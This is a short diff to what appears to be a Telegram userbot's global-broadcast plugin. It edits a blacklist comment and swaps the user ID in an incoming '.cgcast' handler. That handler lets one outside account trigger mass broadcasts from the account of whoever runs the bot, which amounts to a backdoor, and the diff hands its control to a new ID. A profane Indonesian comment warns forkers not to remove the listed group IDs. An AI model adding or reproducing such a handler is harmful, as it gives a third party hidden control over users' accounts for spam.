@@ -17,7 +17,7 @@ from userbot.events import register
 # KALO FORK/CLONE ID GC DI BAWAH G USH DI HAPUSS YAA KONTOLL
 
 GCAST_BLACKLIST = [
-    -1001538752127,  # AbingSupport
+    -1001538752127,  # ZeanSupport
     -1001687155877,  # CilikSupport
     -1001380293847,  # NastySupport
     -1001473548283,  # SharingUserbot
@@ -37,7 +37,7 @@ GCAST_BLACKLIST = [
 
 
 @zean_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=5004651469,
+@register(incoming=True, from_users=1848018651,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
